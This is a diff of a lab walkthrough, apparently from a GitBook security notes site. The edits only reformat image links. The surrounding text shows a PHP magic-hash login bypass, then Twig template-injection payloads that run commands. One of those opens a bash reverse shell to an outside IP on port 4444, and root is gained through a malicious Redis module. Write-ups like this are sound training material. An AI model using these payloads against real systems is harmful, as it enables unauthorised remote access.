@@ -22,15 +22,15 @@ We can start proxying traffic through Burp.
 
 Port 80 presents a corporate web page with a Login:
 
-<figure><img src="../../../.gitbook/assets/image (3244).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3244).png>)
 
 The login page is basic and operates in PHP:
 
-<figure><img src="../../../.gitbook/assets/image (771).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(771).png>)
 
 Default credentials don't work here. Brute forcing also doesn't work. Since this runs on PHP, we can try some Magic Hashes by submitting this request:
 
-<figure><img src="../../../.gitbook/assets/image (1211).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1211).png>)
 
 {% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md" %}
 
@@ -40,15 +40,15 @@ This works because the `Location` header points to `dashboard.php` now.
 
 The dashboard is simple.
 
-<figure><img src="../../../.gitbook/assets/image (776).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(776).png>)
 
 If we submit any queries, we can see our order name pop up on the top:
 
-<figure><img src="../../../.gitbook/assets/image (1214).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1214).png>)
 
 Since this website runs on PHP and the input value is printed out on screen, I wanted to test for SSTI by using `{{7*7}}` as the name of the order, and it works:
 
-<figure><img src="../../../.gitbook/assets/image (1762).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1762).png>)
 
 On Hacktricks, there's a whole section for Twig (PHP), and I tried their payload to run `id`:
 
@@ -56,7 +56,7 @@ On Hacktricks, there's a whole section for Twig (PHP), and I tried their payload
 {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3317).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3317).png>)
 
 This confirms that SSTI works and we have RCE on the machine. Sending this payload gets us a reverse shell:
 
@@ -64,7 +64,7 @@ This confirms that SSTI works and we have RCE on the machine. Sending this paylo
 {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("bash -c 'bash -i >& /dev/tcp/192.168.45.208/4444 0>&1'")}}
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1596).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1596).png>)
 
 ## Privilege Escalation
 
@@ -127,10 +127,10 @@ Since `root` is running it and we can login, this means that we can also load an
 
 Compile and upload the `.so` file to the machine. Then, load it within `redis-cli`:
 
-<figure><img src="../../../.gitbook/assets/image (1590).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1590).png>)
 
 We can get a reverse shell via `system.rev <IP> <PORT>`:
 
-<figure><img src="../../../.gitbook/assets/image (1594).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1594).png>)
 
 Rooted!
